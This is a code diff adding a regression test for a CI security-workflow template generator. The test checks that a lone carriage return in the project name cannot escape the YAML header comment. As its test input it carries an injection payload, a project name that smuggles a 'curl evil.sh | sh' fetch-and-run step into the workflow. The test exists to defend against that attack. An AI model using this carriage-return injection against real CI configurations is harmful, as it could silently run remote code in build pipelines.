@@ -47,6 +47,17 @@ describe('security-workflow template (supply chain)', () => {
     expect(wf).not.toContain('\n  run: curl evil.sh');
   });
 
+  it('neutralises lone-CR payloads (YAML treats \\r as a line break too)', () => {
+    // v0.8.3 regression: a \r without \n survived the old /\r?\n/ flattening
+    // and broke out of the header comment — silently disabling the whole gate.
+    const wf = securityWorkflowTemplate('evil\r- run: curl evil.sh | sh');
+    expect(wf).not.toContain('\r');
+    const lines = wf.split('\n');
+    expect(lines[0].startsWith('# Security gate for ')).toBe(true);
+    expect(lines[1].startsWith('#')).toBe(true);
+    expect(wf).not.toContain('\n- run: curl evil.sh');
+  });
+
   it('keeps gitleaks + npm audit + audit gate jobs', () => {
     const wf = securityWorkflowTemplate('demo');
     expect(wf).toContain('gitleaks/gitleaks-action@');
